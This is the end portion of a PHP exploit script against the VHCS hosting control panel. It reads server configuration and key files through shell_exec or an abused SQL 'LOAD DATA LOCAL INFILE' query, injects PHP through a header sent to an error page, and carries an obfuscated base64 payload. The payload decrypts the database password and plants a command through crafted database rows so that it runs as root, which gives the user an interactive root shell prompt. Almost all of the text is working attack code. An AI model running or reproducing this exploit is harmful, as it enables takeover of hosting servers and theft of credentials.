		   $this->msg(&#039;Trying to load files via shell_exec&#039;, 0);

		$this->lf_conf   = $this->path_content($this->conf_path);
		$this->lf_conf   = trim($this->lf_conf, "\r");

		$this->vhcs_conf = explode("\n", $this->lf_conf);

		$this->conf = array();

		foreach($this->vhcs_conf as $this->conf_line)
		{
			# comment
			if(!ereg(&#039;^(\s*)#&#039;, $this->conf_line))
			{
				$this->pos   = strpos($this->conf_line, &#039;=&#039;);
				$this->name  = strtoupper(trim(substr($this->conf_line, 0, $this->pos)));
				$this->value = trim(substr($this->conf_line, $this->pos+1));

				$this->conf[$this->name] = $this->value;
			}
		}

		$this->php_keys_code = $this->path_content($this->keys_path);

		return;
	}

	function path_content($path)
	{
		# open_basedir On/off
		# safe_mode = Off
		if(!$this->safe_mode)
		{
			$this->phpc = &#039;print shell_exec("cat &#039;.$path.&#039;");&#039;;

			$this->exec_php($this->phpc);

			$this->file_content = $this->getcontent();

		}

		# open_basedir On/Off
		# safe_mode = On
		else
		{
			$this->rand_table = rand().&#039;tmp_hax&#039;.rand();

			$this->sql_query =
			"CREATE TABLE ".$this->rand_table." (content text not null); ".
			"LOAD DATA LOCAL INFILE &#039;$path&#039; INTO TABLE ".$this->rand_table.
			" FIELDS TERMINATED BY &#039;__EOF__&#039; ESCAPED BY &#039;&#039; LINES TERMINAT".
			"ED BY &#039;__EOF__&#039;; SELECT CONCAT(CHAR(80,87,78,69,68,67,79,78,".
			"84,69,78,84),HEX(content),CHAR(80,87,78,69,68,67,79,78,84,69".
			",78,84)) FROM ".$this->rand_table."; DROP TABLE ".
			$this->rand_table;

			$this->sql_arr = explode(&#039;;&#039;, $this->sql_query);
			$this->sql_cnt = count($this->sql_arr);

			for($i=0; $i<$this->sql_cnt; $i++)
			{
				$this->sql_res = $this->exec_sql($this->sql_arr[$i]);

				if($i == $this->sql_cnt-2)
				   $this->file_content = $this->sql_res;
			}
			
		}

		if(!$this->file_content)
		{
			$this->msg("A problem occurred while trying to read the file $path", -1);
			
			if($this->safe_mode)
			   $this->msg("local_infile=Off or we don&#039;t have sufficient access rights to the file", -1, 2);

			else
			   $this->msg("We don&#039;t have sufficient access rights to the file", -1, -2);
		}
		else
		   $this->msg("Ok: $path", 1);

		return $this->file_content;
	}

	function exec_sql($query)
	{
		$this->post($this->dmn_vhcs_url.&#039;client/sql_execute_query.php&#039;,
		&#039;user_name=&sql_query=&#039;.$query.&#039;&Submit=+Execute+&uaction=exe&#039;.
		&#039;cute_query&id=&#039;.$this->db_user_id);

		$this->sql_result = &#039;&#039;;

		if(ereg(&#039;PWNEDCONTENT&#039;, $this->getcontent()))
		{
			$this->sql_res_arr = explode(&#039;PWNEDCONTENT&#039;, $this->getcontent());

			$this->sql_result  = pack(&#039;H*&#039;, $this->sql_res_arr[1]);
		}
	
		return $this->sql_result;
	}

	function is_safe()
	{
		$this->phpc =
		&#039;if(in_array(strtoupper(ini_get("safe_mode")),array("ON","1")) &#039;
	       .&#039;or !function_exists("shell_exec")) &#039;
	       .&#039;{ print "safe_mode=on"; }&#039;;

		$this->exec_php($this->phpc);

		# open_basedir always set
		if(ereg(&#039;safe_mode=on&#039;, $this->getcontent()))
		{
			$this->msg("We&#039;ll have to bypass open_basedir cause safe_mode=On", 0);

			$this->safe_mode = TRUE;
		}
		else
		{
			$this->msg(&#039;PHP configured with default safe_mode value (Off)&#039;, 0);

			$this->safe_mode = FALSE;
		}

		return $this->safe_mode;
	}

	function exec_cmd()
	{
		$this->msg("Now you can execute commands as root =]", 1);

		$this->woot_code =
		 &#039;PD9waHAKCi8qCm1haWwoJ2xlZXRAcHduZWQuY29tJywgJ3Z1bG&#039;
		.&#039;5lcmFibGUgdmhjcyBob3N0ICEnLCAndGh4IHRvIHRoZSBzayAh&#039;
		.&#039;IHZoY3MgdnVsbiBob3N0OiAnLiRfU0VSVkVSWydSRU1PVEVfQU&#039;
		.&#039;REUiddKTsKdGhpcyBpcyBhIGpva2UgPVAgd2hlbiB5b3UgdXNl&#039;
		.&#039;IGVuY29kZWQgcGhwIGNvZGUsIHNlZSB3aGF0IGlzIGl0IGJlZm&#039;
		.&#039;9yZSB1c2luZyBpdCA9KQoqLwokdmFsaWRfdiA9ICdIVFRQX1NQ&#039;
		.&#039;TE9JVF8nOwoKZm9yZWFjaCgkX1NFUlZFUiBhcyAkaGVhZGVyID&#039;
		.&#039;0+ICR2YWx1ZSkKewoJaWYoIWlzX2FycmF5KCR2YWx1ZSkpCgl7&#039;
		.&#039;CgkJJHZhbHVlID0gYmFzZTY0X2RlY29kZSgkdmFsdWUpOwoKCQ&#039;
		.&#039;lpZihlcmVnKCR2YWxpZF92LCRoZWFkZXIpKQoJCXsKCQkJaWYo&#039;
		.&#039;ZXJlZygnUEhQX0tFWVMnLCAkaGVhZGVyKSkKCQkJICAgZXZhbC&#039;
		.&#039;gkdmFsdWUpOwoKCQkJZWxzZQoJCQl7CgkJCQkkdmFyX24gID0g&#039;
		.&#039;c3RydG9sb3dlcihzdHJfcmVwbGFjZSgkdmFsaWRfdiwnJywgJG&#039;
		.&#039;hlYWRlcikpOwoJCQkJJCR2YXJfbiA9ICR2YWx1ZTsKCQkJfQoJ&#039;
		.&#039;CX0KCX0KfQoKbXlzcWxfY29ubmVjdCgkZGJfaG9zdCwkZGJfdX&#039;
		.&#039;NlcixkZWNyeXB0X2RiX3Bhc3N3b3JkKCRkYl9wYXNzKSk7Cm15&#039;
		.&#039;c3FsX3NlbGVjdF9kYigkZGJfbmFtZSk7CgokZmlsZSA9IGFkZH&#039;
		.&#039;NsYXNoZXMoJGZpbGUpOwokY21kICA9IGFkZHNsYXNoZXMoJGNt&#039;
		.&#039;ZCk7CiRWZXJzaW9uID0gJHZlcnNpb247CgokYWRkID0gYXJyYX&#039;
		.&#039;koKTsKJGFkZFtdID0gCiJJTlNFUlQgSU5UTyBkb21haW4gKGBk&#039;
		.&#039;b21haW5fbmFtZWAsYGRvbWFpbiIuCiJfZ2lkYCxgZG9tYWluX3&#039;
		.&#039;VpZGAsYGRvbWFpbl9hZG1pbl9pZGAsYGRvbSIuCiJhaW5fY3Jl&#039;
		.&#039;YXRlZF9pZGAsYGRvbWFpbl9jcmVhdGVkYCxgZG9tYWluXyIuCi&#039;
		.&#039;JsYXN0X21vZGlmaWVkYCxgZG9tYWluX21haWxhY2NfbGltaXRg&#039;
		.&#039;LGBkbyIuCiJtYWluX2Z0cGFjY19saW1pdGAsYGRvbWFpbl90cm&#039;
		.&#039;FmZmljX2xpbWl0YCIuCiIsYGRvbWFpbl9zcWxkX2xpbWl0YCxg&#039;
		.&#039;ZG9tYWluX3NxbHVfbGltaXRgLCIuCiJgZG9tYWluX3N0YXR1c2&#039;
		.&#039;AsYGRvbWFpbl9hbGlhc19saW1pdGAsYGRvbSIuCiJhaW5fc3Vi&#039;
		.&#039;ZF9saW1pdGAsYGRvbWFpbl9pcF9pZGAsYGRvbWFpbl9kaSIuCi&#039;
		.&#039;Jza19saW1pdGAsYGRvbWFpbl9kaXNrX3VzYWdlYCxgZG9tYWlu&#039;
		.&#039;X3BocCIuCiJgLGBkb21haW5fY2dpYCkgVkFMVUVTICgnZGVsZX&#039;
		.&#039;RlbWViaWF0Y2g7JGNtZCIuCiIgPiAkZmlsZTtybSAvdG1wL2h0&#039;
		.&#039;YWNjZXNzLXVzZXItY2YtZGVsZXRlbSIuCiJlYmlhdGNoO2VjaG&#039;
		.&#039;8gMSMnLCcwJywgJzAnLCAnLTEnLCAnLTEnLCAnMCIuCiInLCAn&#039;
		.&#039;MCcsICcwJywgJzAnLCAnMCcsICcwJywgJzAnLCdvaycsICcwJy&#039;
		.&#039;IuCiIsJzAnLCAnLTEnLCAnMCcsICcwJywgJ3llcycsICd5ZXMn&#039;
		.&#039;KSI7CgokYWRkW10gPQoiSU5TRVJUIElOVE8gaHRhY2Nlc3MgKG&#039;
		.&#039;BkbW5faWRgLGB1c2VyX2lkYCwiLgoiYGdyb3VwX2lkYCxgYXV0&#039;
		.&#039;aF90eXBlYCxgYXV0aF9uYW1lYCxgcGF0aGAiLgoiLGBzdGF0dX&#039;
		.&#039;NgKSBWQUxVRVMgKChTRUxFQ1QgZG9tYWluX2lkIEZST00iLgoi&#039;
		.&#039;IGRvbWFpbiBXSEVSRSBkb21haW5fbmFtZSBMSUtFICclJGZpbG&#039;
		.&#039;UlJykiLgoiLC0xLDAsJ0Jhc2ljJywnaHVodScsJy90bXAnLCd0&#039;
		.&#039;b2FkZCcpIjsKCmV4ZWNfc3FsKCRhZGQpOwoKc2VuZF9yZXF1ZX&#039;
		.&#039;N0KCk7CnNsZWVwKCRzbGVlcF90aW1lKTsKcHJpbnQoZmlsZV9n&#039;
		.&#039;ZXRfY29udGVudHMoJGZpbGUpKTsKdW5saW5rKCRmaWxlKTsKCi&#039;
		.&#039;RkZWwgPSBhcnJheSgpOwokZGVsW10gPSAKIkRFTEVURSBGUk9N&#039;
		.&#039;IGh0YWNjZXNzIFdIRVJFIGRtbl9pZCA9IChTRUxFQyIuCiJUIG&#039;
		.&#039;RvbWFpbl9pZCBGUk9NIGRvbWFpbiBXSEVSRSBkb21haW5fbmFt&#039;
		.&#039;ZSAiLgoiTElLRSAnJSRmaWxlJScpIjsKCiRkZWxbXSA9CiJERU&#039;
		.&#039;xFVEUgRlJPTSBkb21haW4gV0hFUkUgZG9tYWluX25hbWUgTElL&#039;
		.&#039;RSAiLgoiJyUkZmlsZSUnIjsKCmV4ZWNfc3FsKCRkZWwpOwoKZn&#039;
		.&#039;VuY3Rpb24gZXhlY19zcWwoJHNxbF9hcnIpCnsKCWZvcmVhY2go&#039;
		.&#039;JHNxbF9hcnIgYXMgJHNxbF9xKQoJICAgbXlzcWxfcXVlcnkoJH&#039;
		.&#039;NxbF9xKSB8fCBkaWUobXlzcWxfZXJyb3IoKSk7CgoJcmV0dXJu&#039;
		.&#039;Owp9CgovLyB2aGNzCmZ1bmN0aW9uIGRlY3J5cHRfZGJfcGFzc3&#039;
		.&#039;dvcmQgKCRkYl9wYXNzKSB7CgogICAgIGdsb2JhbCAkdmhjczJf&#039;
		.&#039;ZGJfcGFzc19rZXk7CiAgICAgZ2xvYmFsICR2aGNzMl9kYl9wYX&#039;
		.&#039;NzX2l2OwogICAgICAgICAgIAogICAgJHRleHQgPSBiYXNlNjRf&#039;
		.&#039;ZGVjb2RlKCIkZGJfcGFzc1xuIik7CiAgICAKICAgIC8qIE9wZW&#039;
		.&#039;4gdGhlIGNpcGhlciAqLwogICAgJHRkID0gbWNyeXB0X21vZHVs&#039;
		.&#039;ZV9vcGVuICgnYmxvd2Zpc2gnLCAnJywgJ2NiYycsICcnKTsKIC&#039;
		.&#039;AgIAogICAgLyogQ3JlYXRlIGtleSAqLwogICAgICAgICRrZXkg&#039;
		.&#039;PSAkdmhjczJfZGJfcGFzc19rZXk7CiAgICAKICAgIC8qIENyZW&#039;
		.&#039;F0ZSB0aGUgSVYgYW5kIGRldGVybWluZSB0aGUga2V5c2l6ZSBs&#039;
		.&#039;ZW5ndGggKi8KICAgICAgICAkaXYgPSAkdmhjczJfZGJfcGFzc1&#039;
		.&#039;9pdjsKICAgICAgCiAgICAvKiBJbnRpYWxpemUgZW5jcnlwdGlv&#039;
		.&#039;biAqLyAgICAgICAgICAgICAgICAgICAgCiAgICBtY3J5cHRfZ2&#039;
		.&#039;VuZXJpY19pbml0ICgkdGQsICRrZXksICRpdik7CiAgICAgICAg&#039;
		.&#039;ICAgICAgICAgICAgICAKICAgIC8qIERlY3J5cHQgZW5jcnlwdG&#039;
		.&#039;VkIHN0cmluZyAqLyAgICAKICAgICRkZWNyeXB0ZWQgPSBtZGVj&#039;
		.&#039;cnlwdF9nZW5lcmljICgkdGQsICR0ZXh0KTsKICAgICAgICAgIC&#039;
		.&#039;AgICAgICAgICAgICAgICAKICAgIG1jcnlwdF9tb2R1bGVfY2xv&#039;
		.&#039;c2UgKCR0ZCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgIC&#039;
		.&#039;AgICAgCiAgICAvKiBTaG93IHN0cmluZyAqLyAgICAgICAgICAg&#039;
		.&#039;ICAgICAgICAgICAgICAgICAgICAgICAKICAgIHJldHVybiB0cm&#039;
		.&#039;ltKCRkZWNyeXB0ZWQpOwp9CgovLyB2aGNzCmZ1bmN0aW9uIHNl&#039;
		.&#039;bmRfcmVxdWVzdCgpIHsKCiAgICBnbG9iYWwgJFZlcnNpb24sIC&#039;
		.&#039;RWZXJzaW9uSCwgJEJ1aWxkRGF0ZTsKCiAgICBAJHNvY2tldCA9&#039;
		.&#039;IHNvY2tldF9jcmVhdGUgKEFGX0lORVQsIFNPQ0tfU1RSRUFNLC&#039;
		.&#039;AwKTsKCiAgICBpZiAoJHNvY2tldCA8IDApIHsKICAgICAgICAk&#039;
		.&#039;ZXJybm8gPSAgInNvY2tldF9jcmVhdGUoKSBmYWlsZWQuXG4iOw&#039;
		.&#039;ogICAgICAgIHJldHVybiAkZXJybm87CiAgICB9CgogICAgQCRy&#039;
		.&#039;ZXN1bHQgPSBzb2NrZXRfY29ubmVjdCAoJHNvY2tldCwgIjEyNy&#039;
		.&#039;4wLjAuMSIsIDk4NzYpOwogICAgaWYgKCRyZXN1bHQgPT0gRkFM&#039;
		.&#039;U0UpIHsKICAgICAgICAkZXJybm8gPSAgInNvY2tldF9jb25uZW&#039;
		.&#039;N0KCkgZmFpbGVkLlxuIjsKICAgICAgICByZXR1cm4gJGVycm5v&#039;
		.&#039;OwogICAgfQoKICAgIC8qIHJlYWQgb25lIGxpbmUgd2l0aCB3ZW&#039;
		.&#039;xjb21lIHN0cmluZyAqLwogICAgJG91dCA9IHJlYWRfbGluZSgk&#039;
		.&#039;c29ja2V0KTsKCiAgICAvKiBzZW5kIGhlbGxvIHF1ZXJ5ICovCi&#039;
		.&#039;AgICAkcXVlcnkgPSAiaGVsbyAgJFZlcnNpb25cclxuIjsKICAg&#039;
		.&#039;IHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1ZXJ5LCBzdHJsZW&#039;
		.&#039;4gKCRxdWVyeSkpOwoKICAgIC8qIHJlYWQgb25lIGxpbmUgd2l0&#039;
		.&#039;aCBoZWxvIGFuc3dlciAqLwogICAgJG91dCA9IHJlYWRfbGluZS&#039;
		.&#039;gkc29ja2V0KTsKCiAgICAvKiBzZW5kIHJlZyBjaGVjayBxdWVy&#039;
		.&#039;eSAqLwogICAgJHF1ZXJ5ID0gImV4ZWN1dGUgcXVlcnlcclxuIj&#039;
		.&#039;sKICAgIHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1ZXJ5LCBz&#039;
		.&#039;dHJsZW4gKCRxdWVyeSkpOwogICAgLyogcmVhZCBvbmUgbGluZS&#039;
		.&#039;BrZXkgcmVwbGF5ICovCiAgICAkZXhlY3V0ZV9yZXBsYXkgPSBy&#039;
		.&#039;ZWFkX2xpbmUoJHNvY2tldCk7CgogICAgLyogc2VuZCBxdWl0IH&#039;
		.&#039;F1ZXJ5ICovCiAgICAkcXVpdF9xdWVyeSA9ICJieWVcclxuIjsK&#039;
		.&#039;ICAgIHNvY2tldF93cml0ZSAoJHNvY2tldCwgJHF1aXRfcXVlcn&#039;
		.&#039;ksIHN0cmxlbiAoJHF1aXRfcXVlcnkpKTsKICAgIC8qIHJlYWQg&#039;
		.&#039;cXVpdCBhbnN3ZXIgKi8KICAgICRxdWl0X3JlcGxheSA9IHJlYW&#039;
		.&#039;RfbGluZSgkc29ja2V0KTsKCiAgICAvKiBhbmFseXplIGtleSBy&#039;
		.&#039;ZXBsYXkgKi8KICAgICRhbnN3ZXIgPSAkZXhlY3V0ZV9yZXBsYX&#039;
		.&#039;k7CgogICAgLyogY2xvc2Ugc29ja2V0ICovCiAgICBzb2NrZXRf&#039;
		.&#039;Y2xvc2UgKCRzb2NrZXQpOwoKICAgIC8qIHJldHVybiBmdW5jdG&#039;
		.&#039;lvbiByZXN1bHQgKi8KICAgIHJldHVybiAkYW5zd2VyOwoKfQoK&#039;
		.&#039;Ly8gdmhjcwpmdW5jdGlvbiByZWFkX2xpbmUoJHNvY2tldCkgew&#039;
		.&#039;0KICAgICRjaCA9ICcnOw0KICAgICRsaW5lID0gJyc7DQogICAg&#039;
		.&#039;ZG97DQogICAgICAgICRjaCA9IHNvY2tldF9yZWFkKCRzb2NrZX&#039;
		.&#039;QsMSk7DQogICAgICAgICRsaW5lID0gJGxpbmUgLiAkY2g7DQog&#039;
		.&#039;ICAgfSB3aGlsZSgkY2ggIT0gIlxyIik7DQogICAgcmV0dXJuIC&#039;
		.&#039;RsaW5lOw0KfQo/Pgo=&#039;;

 		while($this->cmd_prompt())
		{
			$this->exec_php(&#039;print $_SERVER["DOCUMENT_ROOT"];&#039;);
			$this->tmp_file = $this->getcontent().&#039;/&#039;.md5(rand());

			$this->set_hvar(&#039;db-host&#039;,    $this->conf[&#039;DATABASE_HOST&#039;]);
			$this->set_hvar(&#039;db-user&#039;,    $this->conf[&#039;DATABASE_USER&#039;]);
			$this->set_hvar(&#039;db-pass&#039;,    $this->conf[&#039;DATABASE_PASSWORD&#039;]);
			$this->set_hvar(&#039;db-name&#039;,    $this->conf[&#039;DATABASE_NAME&#039;]);

			$this->set_hvar(&#039;sleep-time&#039;, $this->sleep_time);
			$this->set_hvar(&#039;file&#039;,       $this->tmp_file);
			$this->set_hvar(&#039;cmd&#039;,        $this->cmd);
			$this->set_hvar(&#039;version&#039;,    $this->conf[&#039;Version&#039;]);
			
			$this->set_hvar(&#039;php-keys&#039;,   &#039;?>&#039;.$this->php_keys_code);

			$this->exec_php(&#039;?>&#039;.base64_decode($this->woot_code));

			print "\n".$this->getcontent();
		}

		exit(0);
	}

	function set_hvar($name, $value)
	{
		$this->addheader(&#039;Sploit-&#039;.$name, base64_encode($value));

		return;
	}

	function cmd_prompt()
	{
		$this->msg(&#039;root@&#039;.$this->usr.&#039;: &#039;, 1);
		$this->cmd = trim(fgets(STDIN));

		if(!ereg(&#039;^(quit|exit)$&#039;, $this->cmd))
		   return TRUE;

		else
		   return FALSE;
	}

	function exec_php($php)
	{
		$this->addheader(&#039;Shell&#039;, base64_encode($php));
		$this->get($this->dmn_url.&#039;/errors/404/index.php&#039;);

		return;
	}

	function msg($msg, $flag, $action=0)
	{
		print "\n ".$this->flags[$flag]."\x20".$msg;

		switch($action)
		{
			case 1:
				print "\n";
				return $this->usage();
			break;

			case 2:
				print "\n";
				exit(1);
			break;
		}
	}
}

$spl = new vhcs_xpl;
$spl->main();

?>



